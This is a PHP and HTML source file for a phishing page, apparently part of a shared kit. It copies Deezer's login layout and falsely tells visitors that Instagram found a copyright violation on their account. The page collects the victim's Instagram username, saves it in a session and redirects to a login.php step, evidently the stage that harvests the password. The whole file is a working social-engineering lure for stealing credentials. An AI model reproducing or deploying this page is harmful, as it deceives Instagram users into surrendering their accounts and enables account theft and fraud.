<?php

if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: login.php?username=$username");
}

// Coded By HydRa & Yiğit Can - @7iqit //

?>	
                                          
<html lang="tr-TR" class="no-js" xmlns:fb="http://www.facebook.com/2008/fbml">
<head>
	<meta charset="utf-8">
	<title>Copyright | Help Center</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta property="fb:app_id" content="241284008322">
	<meta property="og:site_name" content="Deezer">

	<link href="img/hydraicon.png" rel="shortcut icon" type="image/x-icon">

   
   <meta property="og:type" content="website">
   <meta property="og:url" content="#">

	

	<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/npfkoakaabdallkcdbpkkhfilkkngakh">
	<link rel="search" type="application/opensearchdescription+xml" href="xml/opensearch.xml" title="Deezer.com">
	<link rel="canonical" href="login.php">


	<link href="cache/css/sass_c/app-auth.a52ae0cda4701a0aa189.css" rel="stylesheet" type="text/css">
	<script>
if (window.self === window.top) {
	document.domain = '#';
}
</script>
<script src="cache/js/legacy.09c829a3e5225510b815.js"></script>
<script src="cache/js/runtime.8046a83e21c6fed3b78f.js"></script>
<script src="cache/js/bocal-tr-TR.98da80c1370ae1f96b10.js" defer="true"></script>
<script src="cache/js/app-auth.92afb7a1e7f0af7e03cc.js" defer="true"></script>
	
		</head>
<body class="unlogged-root-page dir-ltr " data-theme="dark" data-themed="true">
<div class="tempo-topbar">
    <a href="/" id="topbar-deezer-logo">
    
  </a>
  <div class="tempo-topbar-actions">
      </div>
</div>
<div id="auth-page">
    <div class="auth-form-container auth-login gap-l-bottom">
        <div class="unlogged-authen unlogged-login">
            <div class="unlogged-container">
                <div class="unlogged-container-inner">
                    <div class="unlogged-form-container">
                        <h1 class="auth-title unlogged-heading-2">Copyright Violation</h1>

                        <!-- Partnership Activation entrypoint -->
                                                <div class="auth-partners-card gap-l-top">
                                                    </div>
                        
                        <!-- Switch login / reg -->
                        <div class="auth-links switch-auth-type-link">
    <div>
        If you were redirected to this page, the Instagram team found a rule violation on your account. This can be caused by complaints from your business or blog account.        
    </div>
</div>

                        <!-- Social connect -->
                        <div class="unlogged-socials-btn-container">
    <button class="tempo-btn-social loader" id="home_account_fb" role="button" data-tracking="1" data-tracking-tag="unlogged_home_click" data-tracking-params="{'type': 'facebook'}" data-login-redirect="{&quot;type&quot;:&quot;refresh&quot;,&quot;link&quot;:&quot;\/&quot;}">
  <path></path></svg>
  <span class="tempo-btn-label">Instagram | Log ın</span>
</button>

</div>                
                        <!-- Auth form -->
                        <form method="get" id="login_form" >
    <div class="unlogged-input-container">
    <input class="unlogged-input" type="username" name="username" minlength="4" placeholder="Username" required="" value="">
							</div>
	<div>						
   <button type="username" class="auth-cta gap-m-top">
        <span class="unlogged-btn-label">Continue</span>
    </button>
</div>


<div class="recaptcha-wrapper">
    <div class="recaptcha-container">
        <div id="recaptcha_enterprise_container"></div>    </div>
</div>

    

  
    <input type="hidden" id="login_method" name="login_method" value="email">
</form>

<div class="auth-links gap-l-vertical">
    <a href="https://www.instagram.com/accounts/password/reset/" id="login_forgot_password" class="auth-link-btn" role="button">
        <button  class="bold">Forgot Password ?</button>
    </a>
    </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Recaptcha Legal mentions -->
        
    </div>
</div>
<div id="react-footer" class="footer-container"></div>
<div class="react-cookie" id="react-cookie"></div>
<div class="modal" id="modal" role="dialog" aria-hidden="true" style="display: none;">
	<div class="modal-backdrop"></div>
	<div class="modal-wrapper"></div>
</div><!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-PPQNZ6" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
    'deezer_user_id': 0,
    'dzr_uniq_id': 'dzr_uniq_id_fr6df580c8b57eb545caac10bba3ef3dde849b87',
    'offer_id': 0,
    'new_user': 0,
    'sub': 0,
    'country': 'TR'
});
window.dataLayer.push({"virtualpageurl":"\/tr\/login","pagename":"login","language":"tr","uilogged":false,"pagecategory":"login"});
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-PPQNZ6');</script>
<!-- End Google Tag Manager -->
<noscript></noscript><script type="text/javascript" src="/vmKaNSBrT-Jrz0R_MA/YG1mcwrbfOOY/AxAqCSofPw/DiguZR/0xM0UB"></script></body>
</html>
